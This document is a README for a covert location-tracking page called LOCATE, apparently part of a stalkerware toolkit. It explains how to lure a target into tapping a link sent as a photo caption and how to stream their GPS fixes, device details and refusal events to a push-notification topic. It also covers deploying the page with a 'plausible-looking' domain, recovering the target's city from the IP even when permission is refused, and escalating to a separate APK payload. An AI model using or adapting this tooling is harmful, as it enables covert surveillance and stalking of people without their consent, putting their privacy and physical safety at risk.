# LOCATE — link-based position sharing

One static page. Hosted, not archived, not installed. The target taps a link, allows
location, and coordinates arrive as push messages until the tab closes.

Nothing here is a payload. There is no APK, no permission grant beyond the browser's own
location prompt, and no persistence past the tab.

- **Site:** https://<your-subdomain>.surge.sh/
- **Feed:** https://ntfy.sh/YOUR_TOPIC
- **Source:** `locate/index.html`, `locate/robots.txt`

---

## 1. Why a link and not a file

`navigator.geolocation` requires a secure context. `file://` is not one — Chrome Android and
Safari iOS both refuse. So a `.html` attachment cannot read coordinates no matter how it is
disguised or which container it is stuffed into. The page has to be served over HTTPS, which
means a link.

The file is still useful as the message: send a **photo**, put the link in the caption. One tap
on the link, one location prompt. That is the whole funnel.

---

## 2. What the page does

| On | Behaviour |
|---|---|
| load | `POST` a description line — timezone, language, viewport, DPR, mobile flag |
| first fix | `watchPosition` with high accuracy, map tile under the crosshair, readouts |
| movement >20 m or 45 s | `POST` a coordinate line with accuracy and sequence number |
| permission denied | `POST` a `DENY` line, show a retry button, state the fix in the UI |
| `pagehide` | `sendBeacon` a `HIDE` line with the fix count |
| `visibilitychange` | re-arms the watch and the wake lock when the tab returns |

Feed line shapes:

```
OPEN tz=Asia/Jakarta l=id-ID vp=412x811 dpr=2.625 m=1
LOC -6.175398,106.827200 ±5m n=3 sdk=on
DENY izin lokasi ditolak
WEAK sinyal lemah (3)
HIDE fixes=12 t=09:41:07
```

The map is Esri World Imagery raster tiles, keyless, one tile at zoom 16 recentred on each
fix — roughly 900 m across, so an accuracy ring in tens of metres stays legible.

Verified on a real Chrome (Android 15 emulator): `OPEN`, one coarse `±500000m` fix, then
`-6.175398,106.827200 ±5m` after `adb emu geo fix 106.8272 -6.1754`. Tile endpoint returns
`image/jpeg` 200.

---

## 3. Reading the feed

Subscribe rather than poll, because the cache is short.

1. Install **ntfy** (Play Store / F-Droid / App Store), add topic `YOUR_TOPIC`. Every fix
   becomes a push notification.
2. Or open https://ntfy.sh/YOUR_TOPIC in a browser for a live stream.
3. Or poll — **12 hours only**, then messages are gone:

```bash
curl -s "https://ntfy.sh/YOUR_TOPIC/json?poll=1" | jq -r .message
```

Paste a coordinate into `https://maps.google.com/?q=<lat>,<lon>`.

If the feed matters beyond a day, subscribe with the ntfy app. Polling every few hours also
works; nothing else is needed.

---

## 4. Rotating a topic

One topic per delivery keeps feeds from crossing. Edit one line in `locate/index.html`:

```js
var ENDPOINT = "https://ntfy.sh/YOUR_TOPIC";
```

Publish a topic that cannot be guessed — the topic name is the password, there is no auth:

```bash
# https://ntfy.sh/app has a generator, or:
python -c "import secrets; print('ovs-' + secrets.token_hex(4))"
```

Then re-run the deploy below. The old topic keeps its own history.

`Cache: no` is not used: a dropped message would be lost rather than re-delivered when the
target's connection blips. The 12-hour cache is the desirable half of the trade.

---

## 5. Deploying

Requires the `surge` CLI (`npm i -g surge`) and the token from `HOSTING.md`.

```powershell
$env:SURGE_TOKEN="<token from HOSTING.md>"
surge locate <your-subdomain>.surge.sh
```

Only `index.html` and `robots.txt` live in `locate/` — that directory is the published root, so
documentation stays in `docs/` and never appears on the site.

After the first publish, the account email must be verified or surge pauses the domain:
`The publisher of <domain> needs to verify their email address`. The link arrives in the
surge welcome mail and serves the page again the moment it is opened.

Custom domain instead of `*.surge.sh`: add a `CNAME` file to `locate/` containing the domain,
point DNS at surge, and publish. Free accounts allow it.

---

## 6. Limits, without dressing them up

- **The tab must stay open.** Chrome suspends `watchPosition` when the tab is closed or the
  browser is killed. A wake lock holds the screen on while the tab is visible, which drains
  battery and is itself noticeable. This is the ceiling of the link approach.
- **iOS re-prompts.** Safari asks for location per session; Chrome Android remembers per site.
  Expect an extra prompt each visit on iOS.
- **Accuracy is browser-grade.** 10–100 m in a city, worse indoors. Satellite lock is not
  available to a web page.
- **Permission refused still leaves a trace.** The `DENY` line carries the request IP, so the
  city is recoverable even in the worst case.
- **The URL is visible.** The target sees `<your-subdomain>.surge.sh`. There is no disguise
  available at this level, only a plausible-looking name.

When the tab is closed and location must keep flowing, this is the point where the APK route
`Location`-only takes over. The two compose: link first, APK only if the gap starts to matter.

---

## 7. Related

- `docs/PAYLOAD.md` — the APK route, including its ordering traps.
- Email verification for the host account is in `HOSTING.md`. That mailbox is not otherwise
  monitored; if the account is ever lost, re-publish under a new account and update the topic.
